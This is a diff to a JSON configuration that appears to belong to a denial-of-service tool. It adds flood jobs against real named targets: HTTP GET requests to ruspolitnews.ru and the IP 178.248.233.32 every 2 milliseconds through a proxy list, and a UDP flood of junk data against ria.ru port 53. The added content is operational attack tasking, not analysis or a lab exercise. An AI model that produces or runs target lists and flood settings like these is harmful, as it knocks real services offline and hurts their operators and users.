@@ -23,6 +23,50 @@
           "proxy_urls": "{{ get_proxylist }}"
         }
       }
+    },
+    {
+      "type": "http",
+      "args": {
+        "method": "GET",
+        "path": "http://ruspolitnews.ru:443/",
+        "interval_ms": 2,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist }}"
+        }
+      }
+    },
+    {
+      "type": "http",
+      "args": {
+        "method": "GET",
+        "path": "http://178.248.233.32:80/",
+        "interval_ms": 2,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist }}"
+        }
+      }
+    },
+    {
+      "type": "http",
+      "args": {
+        "method": "GET",
+        "path": "http://178.248.233.32:80/",
+        "interval_ms": 2,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist }}"
+        }
+      }
+    },
+    {
+      "type": "udp",
+      "args": {
+        "address": "ria.ru:53",
+        "interval_ms": 10,
+        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
+      }
     }
   ]
 }
